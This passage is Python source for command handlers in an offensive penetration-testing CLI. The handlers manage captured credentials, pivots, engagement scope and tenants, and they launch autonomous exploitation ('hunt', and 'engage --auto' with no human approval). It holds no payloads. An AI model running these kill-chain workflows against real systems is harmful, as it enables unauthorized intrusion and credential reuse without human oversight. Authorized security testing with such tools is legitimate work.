"""Session and campaign operations extracted from the miscellaneous cluster.

Pending status: originals deleted from ``cli/commands/misc_migrated.py``;
this set is registered by ``cli.registry``.
"""

from __future__ import annotations

import base64

import cmd2

from cli.commands._base import LazyOwnCommandSet
from cli.aliases import load_aliases as _load_aliases
from cli.assign import apply_assign as _apply_assign
from cli.autosuggest import render_hint_line as _render_autosuggest_hint
from cli.ops_commands import loot_graph as _loot_graph
from cli.ops_commands import loot_mark as _loot_mark
from cli.ops_commands import loot_reuse as _loot_reuse
from cli.ops_commands import loot_search as _loot_search
from cli.ops_commands import loot_show as _loot_show
from cli.ops_commands import note_add as _note_add
from cli.ops_commands import note_list as _note_list
from cli.ops_commands import pivot_add as _pivot_add
from cli.ops_commands import pivot_list as _pivot_list
from cli.ops_commands import read_phase as _read_phase
from cli.ops_commands import scans_list as _scans_list
from cli.ops_commands import sitrep as _sitrep
from cli.ops_commands import tasks_add as _tasks_add
from cli.ops_commands import tasks_done as _tasks_done
from cli.ops_commands import tasks_list as _tasks_list
from cli.ops_commands import tasks_start as _tasks_start
from cli.show import format_payload as _format_payload
from core.config import save_payload as _save_payload
from modules.module_registry import ModuleRegistry as _ModuleRegistry
from modules.module_registry import format_module_detail as _format_module_detail
from modules.module_registry import format_module_table as _format_module_table
from modules.payload_factory import format_payload_table as _format_payload_table

__all__ = ["SessionOpsCommandSet"]


class SessionOpsCommandSet(LazyOwnCommandSet):
    """Session and campaign operations."""

    phase = "misc"
    category = "12. Miscellaneous"

    @cmd2.with_category("12. Miscellaneous")
    def do_note(self, line):
        """Capture a quick operator note attached to the current target and phase.

        Notes land in sessions/notes.jsonl with timestamp, self.params['rhost'], and phase
        so they survive session restarts and show up in reports.

        Usage:
            ``note``                    — list recent notes for current self.params['rhost']
            ``note <text>``             — save a note for current self.params['rhost']/phase
            ``note -a``                 — list all notes (all targets)
            ``note Found admin creds in /etc/shadow``
            ``note SMB signing disabled on DC01``
        """
        arg = (line or "").strip()
        if not arg or arg == "-a":
            rhost = "" if arg == "-a" else (self.params['rhost'] or "")
            _note_list(rhost=self.params['rhost'])
        else:
            _note_add(
                text=arg,
                rhost=self.params['rhost'] or "",
                phase=_read_phase(),
            )

    @cmd2.with_category("12. Miscellaneous")
    def do_l00t(self, line):
        """Unified loot: show, search, reuse, graph, and mark credentials.

        Aggregates every credentials*.txt and hash*.txt in sessions/ into one
        deduplicated view. Cleartext passwords show green, hashes red.

        Subcommands:
            ``l00t``                              — show all captured loot
            ``l00t search <user|host|hash>``      — search loot for a substring
            ``l00t reuse``                        — rank creds to try on the current rhost
            ``l00t graph``                        — credential graph: harvested / worked / rejected
            ``l00t mark <user|secret> worked|rejected [host]``
                                                  — record an auth outcome (defaults host to rhost)

        Examples:
            ``l00t search admin``
            ``l00t reuse``
            ``l00t mark administrator worked``
            ``l00t mark svc_sql rejected 10.10.11.5``
        """
        arg = (line or "").strip()
        if not arg:
            _loot_show()
            return

        parts = arg.split()
        sub = parts[0].lower()

        if sub == "search":
            if len(parts) < 2:
                print_error("Usage: l00t search <user|host|hash>")
                return
            _loot_search(" ".join(parts[1:]))
        elif sub == "reuse":
            _loot_reuse(self.params.get("rhost") or "")
        elif sub == "graph":
            _loot_graph()
        elif sub == "mark":
            if len(parts) < 3:
                print_error("Usage: l00t mark <user|secret> worked|rejected [host]")
                return
            selector = parts[1]
            outcome = parts[2]
            host = parts[3] if len(parts) > 3 else (self.params.get("rhost") or "")
            _loot_mark(selector, outcome, host)
        else:
            print_error(
                "Usage: l00t [search <q> | reuse | graph | mark <user> worked|rejected [host]]"
            )

    @cmd2.with_category("12. Miscellaneous")
    def do_loot(self, line):
        """Alias for ``l00t`` — unified loot (show/search/reuse/graph/mark).

        See ``help l00t`` for the full subcommand reference.
        """
        self.do_l00t(line)

    @cmd2.with_category("12. Miscellaneous")
    def do_pivot(self, line):
        """Record a newly discovered pivot target or show the pivot chain.

        When you compromise a host and discover a new reachable network/IP,
        record it here. The pivot chain is stored in sessions/pivots.jsonl
        and survives session restarts.

        Usage:
            ``pivot``                        — show full pivot chain
            ``pivot <new-ip>``               — record pivot via current rhost
            ``pivot <new-ip> <note>``        — record with a free-form note
            ``pivot 10.10.10.50``
            ``pivot 10.10.10.50 SMB open, admin share accessible``
        """
        arg = (line or "").strip()
        if not arg:
            _pivot_list()
            return
        parts = arg.split(None, 1)
        new_ip = parts[0]
        note = parts[1] if len(parts) > 1 else ""
        via = self.params.get("rhost") or ""
        _pivot_add(new_ip=new_ip, via_ip=via, note=note)

    @cmd2.with_category("12. Miscellaneous")
    def do_tasks(self, line):
        """View and manage the task queue from sessions/tasks.json.

        Tasks are created automatically by world_model_watcher and the
        autonomous daemon, and can also be added manually. Each task has
        an id, title, status (New/Started/Done/Blocked), and operator.

        Usage:
            ``tasks``             — show active tasks (New + Started)
            ``tasks --all``       — show all tasks including Done
            ``tasks add <text>``  — create a new task
            ``tasks done <id>``   — mark task as Done
            ``tasks start <id>``  — mark task as Started
        """
        arg = (line or "").strip()
        if not arg or arg == "--all":
            _tasks_list(status_filter="all" if arg == "--all" else "active")
        elif arg.startswith("add "):
            _tasks_add(arg[4:].strip())
        elif arg.startswith("done "):
            try:
                _tasks_done(int(arg[5:].strip()))
            except ValueError:
                print_error("Usage: tasks done <integer-id>")
        elif arg.startswith("start "):
            try:
                _tasks_start(int(arg[6:].strip()))
            except ValueError:
                print_error("Usage: tasks start <integer-id>")
        else:
            print_error("Usage: tasks [--all | add <text> | done <id> | start <id>]")

    @cmd2.with_category("12. Miscellaneous")
    def do_scans(self, line):
        """List nmap scan files in sessions/ with age, size, and open ports.

        Without arguments shows all scan files. With an IP filters to scans
        for that target only.

        Usage:
            ``scans``              — all scan files
            ``scans 10.10.11.5``   — scans for that host only
            ``scans rhost``        — shortcut for current rhost
        """
        arg = (line or "").strip()
        if arg == "rhost":
            arg = self.params.get("rhost") or ""
        _scans_list(rhost=arg)

    @cmd2.with_category("12. Miscellaneous")
    def do_sitrep(self, line):
        """Print a unified operational situation report.

        Aggregates in one view: target/attacker/domain, current phase and OS,
        nmap scans found for the active target, captured credentials and
        hashes, tasks backlog (New/Started/Done), operator notes, pivot chain,
        and world model host/vuln/cred counts.

        Run this at the start of a shift, after pivoting to a new target, or
        whenever you need a quick 'where are we?' during the engagement.

        Usage:
            ``sitrep``
        """
        _sitrep(self.params)

    @cmd2.with_category("12. Miscellaneous")
    def do_assign(self, line):
        """assign a parameter value, persist to payload.json and refresh aliases.

        The mutation is delegated to :func:`cli.assign.apply_assign` which
        writes ``payload.json`` atomically through :func:`core.config.save_payload`
        when the parameter is known. After a successful update, aliases are
        re-rendered so commands like ``backdoor`` or ``coerce_plus`` immediately
        reflect the new value without a shell restart.

        :param line: '<parameter> <value>'.
        :type line: str
        :return: None
        """
        args = shlex.split(line)
        if len(args) != 2:
            print_error(f"{YELLOW} Usage: assign <parameter> <value>{RESET}")
            return

        param, value = args
        issues: list = []
        updated = _apply_assign(
            self.params,
            param,
            value,
            save=_save_payload,
            on_issue=issues.append,
        )
        if not updated:
            print_error(f"Unknown parameter: {param}{RESET}")
            return

        try:
            self.aliases.update(_load_aliases(self.params))
        except Exception as exc:
            print_warn(f"aliases refresh failed after assign: {exc}")

        for issue in issues:
            print_warn(f"{param}: {issue.message}")

        self.refresh_prompt()
        print_msg(f"{YELLOW}{param} assign to {GREEN}{self.params[param]} {RESET}")

    @cmd2.with_category("12. Miscellaneous")
    def do_tenant(self, line):
        """Manage multi-tenancy: list, switch, or create engagement tenants.

        Each tenant has its own payload profile and session directory,
        providing isolated environments for parallel engagements.

        Usage:
            ``tenant``                           list all tenants
            ``tenant switch <id>``               activate a tenant
            ``tenant create <name>``             create a new tenant from current payload
            ``tenant info``                      show active tenant details

        Tenant payloads are stored in ``payloads/<id>.json`` and sessions
        in ``sessions/<id>/``. The default tenant always exists.
        """
        try:
            from modules.lazy_rbac import TenantManager, get_tenant_manager
        except ImportError:
            print_error("Multi-tenancy module not available.")
            return

        tm = get_tenant_manager()
        args = shlex.split(line or "")

        if not args:
            tenants = tm.list_tenants()
            active = tm.get_active()
            print_msg(f"{BOLD}Tenants:{RESET}")
            for t in tenants:
                marker = f"{GREEN}* {RESET}" if active and active.tenant_id == t.tenant_id else "  "
                print_msg(f"  {marker}{t.tenant_id:<20} {t.name:<30} {t.sessions_dir}")
            return

        action = args[0].lower()
        if action == "switch":
            if len(args) < 2:
                print_error("Usage: tenant switch <id>")
                return
            try:
                tc = tm.switch_tenant(args[1])
                print_msg(f"{GREEN}Switched to tenant: {tc.name}{RESET}")
                print_msg(f"  Payload: {tc.payload_path}")
                print_msg(f"  Sessions: {tc.sessions_dir}")
                print_msg("Reload the shell or run 'load_payload' to apply the new configuration.")
            except ValueError as e:
                print_error(str(e))
        elif action == "create":
            if len(args) < 2:
                print_error("Usage: tenant create <name>")
                return
            try:
                name = " ".join(args[1:])
                tc = tm.create_tenant(name)
                print_msg(f"{GREEN}Tenant created: {tc.name} ({tc.tenant_id}){RESET}")
                print_msg(f"  Payload: {tc.payload_path}")
                print_msg(f"  Sessions: {tc.sessions_dir}")
            except ValueError as e:
                print_error(str(e))
        elif action == "info":
            active = tm.get_active()
            if active:
                print_msg(f"{BOLD}Active tenant:{RESET}")
                print_msg(f"  Name: {active.name}")
                print_msg(f"  ID: {active.tenant_id}")
                print_msg(f"  Payload: {active.payload_path}")
                print_msg(f"  Sessions: {active.sessions_dir}")
            else:
                print_warn("No active tenant.")
        else:
            print_error(f"Unknown action: {action}")
            print_msg("Available: switch, create, info")

    @cmd2.with_category("12. Miscellaneous")
    def do_scope(self, line):
        """Manage the authorized engagement scope and the scope-guard posture.

        The scope guard checks every offensive command against this list before
        it runs. While the scope is empty the guard is dormant, so defining a
        scope is opt-in and never disrupts an existing campaign. Entries may be
        CIDR networks, bare IP addresses or hostnames (a leading ``*.`` matches
        subdomains).

        Usage:
            ``scope``                          show the scope and the mode
            ``scope add <cidr|ip|host>``       authorize an entry
            ``scope rm <cidr|ip|host>``        remove an entry
            ``scope clear``                    remove every entry
            ``scope mode <off|warn|enforce>``  set the enforcement posture

        Modes:
            ``off``      guard disabled.
            ``warn``     out-of-scope offensive commands run but warn (default).
            ``enforce``  out-of-scope offensive commands are blocked pending
                         interactive confirmation.
        """
        args = shlex.split(line or "")
        entries = self._scope_entries()
        mode = str(self.params.get("scope_enforcement") or "warn").lower()

        if not args:
            self._scope_render(entries, mode)
            return

        action = args[0].lower()
        if action == "add":
            if len(args) != 2:
                print_error("Usage: scope add <cidr|ip|host>")
                return
            entry = args[1].strip()
            if entry in entries:
                print_warn(f"Already in scope: {entry}")
                return
            entries.append(entry)
            self._scope_save(entries=entries)
            print_msg(f"Added to scope: {GREEN}{entry}{RESET}")
        elif action in ("rm", "remove", "del"):
            if len(args) != 2:
                print_error("Usage: scope rm <cidr|ip|host>")
                return
            entry = args[1].strip()
            if entry not in entries:
                print_warn(f"Not in scope: {entry}")
                return
            entries.remove(entry)
            self._scope_save(entries=entries)
            print_msg(f"Removed from scope: {entry}")
        elif action == "clear":
            self._scope_save(entries=[])
            print_msg("Scope cleared.")
        elif action == "mode":
            if len(args) != 2 or args[1].lower() not in ("off", "warn", "enforce"):
                print_error("Usage: scope mode <off|warn|enforce>")
                return
            self._scope_save(mode=args[1].lower())
            print_msg(f"Scope enforcement mode set to {GREEN}{args[1].lower()}{RESET}")
        else:
            print_error(f"Unknown scope action: {action!r}. See 'help scope'.")

    @cmd2.with_category("12. Miscellaneous")
    def do_show(self, line):
        """Show params, modules, payloads, or active module options.

        Usage:
            show                       — show all params (default)
            show exploits              — list all exploit modules
            show auxiliary             — list auxiliary modules
            show scanners              — list scanner modules
            show post                  — list post-exploitation modules
            show payloads              — list registered payloads
            show options               — show active module options
            show modules               — list all modules
            show all                   — list all modules by type
        """
        arg = line.strip().lower()
        if not arg:
            rendered = _format_payload(self.params)
            if rendered:
                print_msg(rendered)
            return

        # Module type filters
        type_map = {
            "exploits": "exploit",
            "auxiliary": "auxiliary",
            "scanners": "scanner",
            "scanner": "scanner",
            "post": "post",
            "payloads_modules": "payload",
        }

        if arg in type_map or arg in ("all", "modules"):
            if self._module_registry is None:
                self._module_registry = _ModuleRegistry()
            reg = self._module_registry
            reg.scan()

            if arg == "all" or arg == "modules":
                summary = reg.summary()
                print_msg(f"Module summary ({len(reg)} total):")
                for mtype, count in sorted(summary.items()):
                    print_msg(f"  {mtype.capitalize():<12}: {count}")
                print_msg(f"\nUse 'show {GREEN}<type>{RESET}' to list by type, or 'search {GREEN}<query>{RESET}' to find modules.")
            else:
                mtype = type_map[arg]
                results = reg.by_type(mtype)
                if not results:
                    print_msg(f"No {arg} modules found.")
                else:
                    print_msg(f"{arg.capitalize()} ({len(results)}):")
                    print(_format_module_table(results, cols=("name", "version", "description")))
            return

        if arg == "payloads":
            payloads = self._payload_factory.list()
            if not payloads:
                print_msg("No payloads registered.")
            else:
                print_msg(f"Payloads ({len(payloads)}):")
                print(_format_payload_table(payloads))
            return

        if arg == "options":
            if self._active_module is None:
                print_msg("No active module. Use 'use <module>' first.")
                return
            print(_format_module_detail(self._active_module))
            return

        rendered = _format_payload(self.params)
        if rendered:
            print_msg(rendered)

    @cmd2.with_category("12. Miscellaneous")
    def do_list(self, line):
        """
        Lists all available scripts in the modules directory.

        This method prints a list of available scripts in a formatted manner, arranging
        them into columns. It shows each script with sufficient spacing for readability.

        :param line: This parameter is not used in the method.
        :type line: str
        :return: None
        """

        scripts = self.scripts
        num_columns = 3

        if not scripts:
            print_error(f"No available scripts.{RESET}")
            return

        max_len = max(len(script) for script in scripts)
        column_width = max_len + 2

        rows = [
            scripts[i : i + num_columns] for i in range(0, len(scripts), num_columns)
        ]

        print_msg(f"Available scripts to run:{RESET}")
        for row in rows:
            print_msg(
                "   ".join(
                    f"{script.ljust(column_width)}{RESET}    " for script in row
                )
            )

    @cmd2.with_category("12. Miscellaneous")
    def do_run(self, line):
        """
        Runs a specific LazyOwn script or active module.

        If a module is active (via ``use <module>``), ``run`` executes it.
        Otherwise it runs a script from the toolkit by name.

        :param line: The command line input containing the script name.
        :type line: str
        :return: None
        """

        # Active module execution
        if not line.strip() and self._active_module is not None:
            module = self._active_module
            if module.source == "yaml":
                cmd_name = module.name
                print_msg(f"Running module '{cmd_name}'...")
                self.onecmd(cmd_name)
            else:
                print_msg(f"Running module '{module.name}' (source: {module.source})...")
                if module.source in ("lua",):
                    self.onecmd(module.name)
                else:
                    print_msg(f"Use '{GREEN}{module.name}{RESET}' directly to run.")
            return

        args = shlex.split(line)
        if not args:
            print_error(f"Usage: {GREEN} run <script_name> {RESET}")
            return

        script_name = args[0]
        if script_name in self.scripts:
            getattr(self, f"run_{script_name}")()
        else:
            print_error(f"Unknown script: {CYAN}{script_name}{RESET}")

    @cmd2.with_category("12. Miscellaneous")
    def do_payload(self, line):
        """Load parameters from a specified payload JSON file.

        This function loads parameters from a JSON file specified by the `line` argument and updates the instance's `params` dictionary with the values from the file. If the file does not exist or contains invalid JSON, it will print an appropriate error message.

        Usage:
            payload <filename>

        :param line: The name of the JSON file to load.
        :type line: str

        :returns: None

        Manual execution:
        1. Open and read the specified JSON file.
        2. Update the `params` dictionary with values from the JSON file.
        3. Print a success message if the parameters were successfully loaded.
        4. Handle `FileNotFoundError` if the file does not exist.
        5. Handle `JSONDecodeError` if there is an error decoding the JSON file.

        Dependencies:
        - `json` module for reading and parsing the JSON file.

        Example:
            To execute the function, call `payload payload_10.10.10.10.json`.

        Note:
            - Ensure that the specified JSON file exists in the current directory and is properly formatted.
            - The confirmation message includes color formatting for better visibility.
        """

        filename = line.strip() or "payload.json"

        try:
            with open(filename) as f:
                data = json.load(f)
            for key, value in data.items():
                if key in self.params:
                    self.params[key] = value
            try:
                self.aliases.update(_load_aliases(self.params))
            except Exception as exc:
                print_warn(f"aliases refresh failed after payload reload: {exc}")
            print_msg(f"Parameters loaded from {GREEN}{filename}{RESET}")
            self.onecmd("rrhost")
        except FileNotFoundError:
            print_error(f"{filename} not found")
        except json.JSONDecodeError:
            print_error(f"Error decoding {filename}")

    @cmd2.with_category("12. Miscellaneous")
    def do_next(self, line):
        """Show next-step recommendations or execute the active autosuggest.

        Two modes share the same verb:

        * ``next <command> [N]`` — show ordered chain recommendations for
          ``<command>`` (static kill-chain + nmap-discovered services +
          addon/tool triggers), capped at ``N`` (default 5). Mirrors the
          MCP tool ``lazyown_command_next`` so CLI and AI see the same
          data. This is the chain's complement to ``prev``.
        * ``next`` (no args) — pop and execute the active autosuggest
          accelerator (the dim ``press '.' to run: <cmd>`` line). The
          accelerator alias ``.`` keeps working unchanged.

        Args:
            line: Empty for the accelerator mode, or ``<verb> [limit]``
                for the chain mode.

        Returns:
            None.
        """
        argument = (line or "").strip()
        if argument:
            self._render_chain_next(argument)
            return
        engine = getattr(self, "_autosuggest", None)
        if engine is None:
            print_warn("autosuggest engine is not initialised")
            return
        command = engine.accept()
        if not command:
            print_warn("no active suggestion to execute")
            return
        print_msg(f"running suggested command: {command}")
        try:
            self.onecmd_plus_hooks(command)
        finally:
            try:
                self._refresh_autosuggest(command)
                _render_autosuggest_hint(engine)
            except Exception:
                pass

    @cmd2.with_category("12. Miscellaneous")
    def do_chainmode(self, line):
        """Toggle interactive kill-chain chaining after every command.

        Usage:
            chainmode on          Start the chain flow.
            chainmode off         Stop the chain flow.
            chainmode status      Show whether chaining is active.

        When on, every executed command is followed by a world-model-driven
        prompt listing the next kill-chain step(s). Press Enter to run the
        top suggestion, type ``1..N`` to pick a ranked alternative, type
        any command to override the suggestion and keep chaining from it,
        ``skip`` to continue manually, or ``off`` to exit. The state is
        persisted to ``sessions/chain_mode.json``.

        Args:
            line: Whitespace-stripped sub-command (on/off/status).

        Returns:
            None.
        """
        argument = (line or "").strip().lower()
        engine = getattr(self, "_chain_prompt", None)
        if engine is None:
            print_error("chain mode is not initialised")
            return
        if argument in ("", "status", "show"):
            from cli.chain_mode import MAX_STEPS_DEFAULT as _CHAIN_MAX_STEPS

            state = "on" if engine.enabled else "off"
            steps = int(getattr(engine, "steps_run", 0))
            max_steps = int(getattr(engine.config, "max_steps", _CHAIN_MAX_STEPS))
            print_msg(f"chainmode: {state} (auto-pause after {max_steps} chained steps, {steps} run so far)")
            return
        if argument in ("on", "enable", "1", "yes"):
            engine.set_enabled(True)
            self._persist_chainmode(engine.enabled)
            print_msg(
                "chainmode on — after each command you will be prompted with the "
                "next kill-chain step. Enter=top suggestion, 1..N=alternative, "
                "type any command to override, 'skip' to pass, 'off' to exit."
            )
            return
        if argument in ("off", "disable", "0", "no"):
            engine.set_enabled(False)
            self._persist_chainmode(engine.enabled)
            print_msg("chainmode off")
            return
        print_warn("usage: chainmode [on|off|status]")

    @cmd2.with_category("12. Miscellaneous")
    def do_engage(self, line):
        """Drive a single target through the full kill-chain in one command.

        Usage:
            engage <target>                  Run synchronously on the target IP
            engage <target> --auto           Full auto mode: no human in the loop
            engage <target> --background     Detach into a background worker
            engage <target> --max-switches N Set per-step fallback retry limit
            engage --status                  Tail the engagement log + show pending approvals
            engage --pending                 List approval requests awaiting an operator
            engage --approve <id> [--operator name]
            engage --deny <id>    [--operator name]

        The orchestrator runs ping/OS detect -> nmap -> auto_populate -> enum
        -> exploit-search -> initial-access against the target. Each phase
        consults the ApprovalGate when ``auto_approve`` is false in
        ``payload.json``; gated phases pause for an operator decision before
        executing. Failures auto-switch to the next bridge-catalog
        alternative. Every action is narrated to ``sessions/engagement.log``
        and broadcast through ``modules.collab_bp`` so connected teammates
        see the kill-chain in real time.

        With ``--auto`` the engagement runs with no human in the loop. The
        ApprovalGate is replaced by a ``ScopeBoundAutoGate`` that never
        prompts: it approves every step whose target is inside the authorized
        ``scope`` (or when the scope guard is dormant) and denies any
        out-of-scope target while ``scope_enforcement`` is ``enforce`` — the
        single fail-closed boundary unattended autonomy keeps. When the
        kill-chain finishes a client-ready report is written to ``sessions/``.

        :param line: Target IP plus optional flags.
        :type line: str
        :return: None
        """
        parts = line.split() if line and line.strip() else []
        flags = {p for p in parts if p.startswith("--")}
        positional = [p for p in parts if not p.startswith("--")]

        try:
            sys.path.insert(0, str(Path(__file__).resolve().parent / "skills"))
            sys.path.insert(0, str(Path(__file__).resolve().parent / "modules"))
            from autonomous_daemon import (
                mcp_engage_approve as _engage_approve,
            )
            from autonomous_daemon import (
                mcp_engage_list_pending as _engage_pending,
            )
            from autonomous_daemon import (
                mcp_engage_status as _engage_status,
            )
            from autonomous_daemon import (
                mcp_engage_target as _engage,
            )
        except Exception as exc:
            print_error(f"engage: autonomous_daemon not importable ({exc})")
            return

        if "--status" in flags:
            print_msg(_engage_status(last_n=40))
            return
        if "--pending" in flags:
            print_msg(_engage_pending())
            return

        def _flag_value(flag_name: str) -> str:
            if flag_name not in parts:
                return ""
            try:
                idx = parts.index(flag_name)
                return parts[idx + 1] if idx + 1 < len(parts) and not parts[idx + 1].startswith("--") else ""
            except (ValueError, IndexError):
                return ""

        operator = _flag_value("--operator") or "cli"
        if "--approve" in flags:
            approval_id = _flag_value("--approve")
            if not approval_id:
                print_error("engage --approve requires an approval id")
                return
            print_msg(_engage_approve(approval_id, "approved", operator))
            return
        if "--deny" in flags:
            approval_id = _flag_value("--deny")
            if not approval_id:
                print_error("engage --deny requires an approval id")
                return
            print_msg(_engage_approve(approval_id, "denied", operator))
            return

        if not positional:
            target = self.params.get("rhost", "")
            if not target:
                print_error("engage: provide a target IP or assign rhost <ip> first")
                return
        else:
            target = positional[0]

        max_switches = 3
        for tok in parts:
            if tok.startswith("--max-switches="):
                try:
                    max_switches = int(tok.split("=", 1)[1])
                except ValueError:
                    print_error("engage: --max-switches expects an integer")
                    return
            elif tok == "--max-switches":
                value = _flag_value("--max-switches")
                if value:
                    try:
                        max_switches = int(value)
                    except ValueError:
                        print_error("engage: --max-switches expects an integer")
                        return

        detach = "--background" in flags
        auto = "--auto" in flags
        print_msg(
            f"engage: target={target} background={detach} "
            f"auto={auto} max_switches={max_switches}"
        )
        print_msg(_engage(
            target=target,
            max_switches_per_step=max_switches,
            detach=detach,
            auto=auto,
        ))

    @cmd2.with_category("12. Miscellaneous")
    def do_pipeline(self, line):
        """Declarative composition layer: run a YAML pipeline of LazyOwn commands.

        Usage:
            pipeline list                          List every YAML pipeline in pipelines/
            pipeline validate <name>               Parse and check a pipeline schema
            pipeline run <name>                    Execute the pipeline synchronously
            pipeline run <name> --background       Detach into a worker thread
            pipeline run <name> --target <ip>      Override payload.rhost for this run
            pipeline status                        Show the N most recent runs (summary)
            pipeline show <name>                   Print the validated step list

        Pipelines live in pipelines/*.yaml. They compose existing LazyOwn
        commands into ordered, conditional, recoverable plans. Each run is
        persisted under sessions/pipelines/<name>__<run-id>/ with the
        frozen plan, per-step JSON records, and a summary. Live narration
        is broadcast through the same fabric used by ``engage``.

        :param line: Subcommand plus optional positional / flag arguments.
        :type line: str
        :return: None
        """
        parts = line.split() if line and line.strip() else []
        if not parts:
            print_error(
                "pipeline: subcommand required (list | validate <name> | run <name> | status | show <name>)"
            )
            return
        try:
            sys.path.insert(0, str(Path(__file__).resolve().parent / "skills"))
            sys.path.insert(0, str(Path(__file__).resolve().parent / "modules"))
            from pipeline_engine import (
                mcp_pipeline_list as _pl_list,
            )
            from pipeline_engine import (
                mcp_pipeline_run as _pl_run,
            )
            from pipeline_engine import (
                mcp_pipeline_status as _pl_status,
            )
            from pipeline_engine import (
                mcp_pipeline_validate as _pl_validate,
            )
        except Exception as exc:
            print_error(f"pipeline: pipeline_engine not importable ({exc})")
            return

        action = parts[0].lower()
        positional = [p for p in parts[1:] if not p.startswith("--")]
        flags = {p for p in parts if p.startswith("--")}

        def _flag_value(flag_name: str) -> str:
            if flag_name not in parts:
                return ""
            try:
                idx = parts.index(flag_name)
                if idx + 1 < len(parts) and not parts[idx + 1].startswith("--"):
                    return parts[idx + 1]
            except (ValueError, IndexError):
                return ""
            return ""

        if action == "list":
            print_msg(_pl_list())
            return
        if action == "status":
            print_msg(_pl_status())
            return
        if action == "validate":
            if not positional:
                print_error("pipeline validate: pipeline name required")
                return
            print_msg(_pl_validate(positional[0]))
            return
        if action == "show":
            if not positional:
                print_error("pipeline show: pipeline name required")
                return
            print_msg(_pl_validate(positional[0]))
            return
        if action == "run":
            if not positional:
                print_error("pipeline run: pipeline name required")
                return
            name = positional[0]
            target = _flag_value("--target") or self.params.get("rhost", "")
            background = "--background" in flags
            print_msg(f"pipeline run: name={name} target={target or '(default)'} background={background}")
            print_msg(_pl_run(name=name, target=target, background=background, onecmd=self.onecmd))
            return
        print_error(f"pipeline: unknown subcommand {action!r}")

    @cmd2.with_category("12. Miscellaneous")
    def do_lazyscript(self, line):
        """
        Executes commands defined in a lazyscript file.

        This function reads a script file containing commands to be executed
        sequentially. Each command is executed using the onecmd method of the
        cmd.Cmd class. The script file should be located in the 'lazyscripts'
        directory relative to the current working directory.

        Args:
            line (str): The name of the script file to execute (e.g., 'lazyscript.ls').

        Example:
            do_lazyscript('example_script.ls')
            This would execute all commands listed in 'lazyscripts/example_script.ls'.

        """
        script_path = os.path.join(os.getcwd(), 'lazyscripts', line)

        if not os.path.isfile(script_path):
            print_error(f"Script file not found: {script_path}")
            return
        with open(script_path) as file:
            commands = file.readlines()

        for command in commands:
            command = command.strip()
            if command:
                print_msg(f"Executing command: {command}")
                self.onecmd(command)

    @cmd2.with_category("12. Miscellaneous")
    def do_hunt(self, line):
        """Run an autonomous exploitation chain against a target.

        Profiles the target's attack surface, ranks exploit candidates by
        confidence, and executes them in order until a shell is obtained or
        the exploit limit is reached. Adapts strategy based on results.

        The engine reads from ``sessions/world_model.json`` to understand
        what services, versions, and vulnerabilities exist. No re-scanning.

        Usage:
            hunt <target_ip> [max_exploits]
            hunt 10.10.11.5
            hunt 10.10.11.5 10

        :param line: Target IP and optional max exploit count.
        :type line: str
        :return: None
        """
        parts = line.strip().split()
        if not parts or not parts[0]:
            print_error("Usage: hunt <target_ip> [max_exploits]")
            return

        target = parts[0]
        max_exploits = int(parts[1]) if len(parts) > 1 and parts[1].isdigit() else 5

        try:
            from modules.autonomous_exploit_engine import AutonomousExploitEngine

            engine = AutonomousExploitEngine()
            print_msg(f"Profiling target: {target}")
            profile = engine.profile(target)
            if not profile.open_ports:
                print_warn(f"No open ports discovered for {target} — running lazynmap first.")
                self.onecmd(f"lazynmap {target}")
                profile = engine.profile(target)
                if not profile.open_ports:
                    print_error(f"Still no open ports after scan. Target {target} may be unreachable.")
                    return
            print_msg(f"  OS: {profile.os_type} {profile.os_version}")
            print_msg(f"  Ports: {profile.open_ports}")
            print_msg(f"  Services: {len(profile.services)}")
            print_msg(f"  Credentials available: {len(profile.credentials)}")
            print_msg(f"  Access level: {profile.access_level}")

            print_msg("Ranking exploit candidates...")
            candidates = engine.rank_exploits(profile)
            candidates = candidates[:max_exploits]
            for i, c in enumerate(candidates):
                print_msg(f"  [{i + 1}] {c.service}:{c.product} {c.version} "
                          f"strategy={c.strategy} confidence={c.confidence:.2f} "
                          f"{'CVE-' + c.cve_id if c.cve_id else ''}")

            if not candidates:
                print_msg("No exploit candidates found.")
                return

            print_msg(f"Executing up to {max_exploits} exploits...")
            results = engine.hunt(target, max_exploits=max_exploits)

            for r in results:
                status = "SUCCESS" if r.success else "FAILED"
                shell = " [SHELL OBTAINED]" if r.shell_obtained else ""
                print_msg(f"  {status}: {r.candidate.service} "
                          f"({r.candidate.strategy}) in {r.duration_ms:.0f}ms{shell}")
                if r.shell_obtained:
                    print_msg(f"    Session: {r.session_id}")
                    self.display_toastr(f"Shell on {target} via {r.candidate.strategy}", type="success")
                if r.error:
                    print_error(f"    Error: {r.error}")

            successes = sum(1 for r in results if r.success)
            shells = sum(1 for r in results if r.shell_obtained)
            print_msg(f"Hunt complete: {successes}/{len(results)} successful, {shells} shells")
        except ImportError as exc:
            print_error(f"autonomous_exploit_engine module not available: {exc}")
        except Exception as exc:
            print_error(f"Hunt operation failed: {exc}")

    @cmd2.with_category("12. Miscellaneous")
    def do_resume(self, line):
        """Browse previous sessions and load a target from a past engagement.

        Scans sessions/ for IP directories with scan data, credentials, or
        world model state, and presents them for quick resume.

        Usage:
            ``resume``      — show the session selector panel
        """
        from cli.session_resumer import SessionResumer
        resumer = SessionResumer()
        target = resumer.render_startup_panel()
        if target:
            from cli.assign import apply_assign as _apply
            _apply(self.params, "rhost", target, save=_save_payload)
            print_msg(f"Resumed session for [bold]{target}[/]. Run 'sitrep' to review.")
        else:
            print_msg("No session selected. Use 'assign rhost <IP>' to start fresh.")

    @cmd2.with_category("12. Miscellaneous")
    def do_getseclist(self, line):
        """Get the SecLists wordlist from GitHub.

        This function downloads and extracts the SecLists wordlist from GitHub to the `/usr/share/wordlists/` directory.

        Usage:
            getseclist

        :param line: This parameter is not used in this function.
        :type line: str

        :returns: None

        Manual execution:
        1. Navigate to the `/usr/share/wordlists/` directory.
        2. Download the SecLists repository using `wget`.
        3. Extract the downloaded ZIP file.
        4. Remove the ZIP file after extraction.

        Dependencies:
        - `wget` must be installed on the system.
        - `unzip` must be installed on the system.
        - `sudo` must be available for downloading and extracting files.

        Example:
            To execute the function, simply call `getseclist`.

        Note:
            - Ensure that you have the necessary permissions to write to the `/usr/share/wordlists/` directory.
            - If `wget` or `unzip` is not installed, the function will fail.
        """

        print_msg(f"Try to get seclist wordlist [;,;] {RESET}")
        self.cmd("""cd /usr/share/wordlists/ && sudo wget -c https://github.com/danielmiessler/SecLists/archive/master.zip -O SecList.zip \
        && sudo unzip SecList.zip \
        && sudo  rm -f SecList.zip""")

    @cmd2.with_category("12. Miscellaneous")
    def do_download_resources(self, line):
        """
        Downloads resources into the `sessions` directory.

        This function performs the following actions:
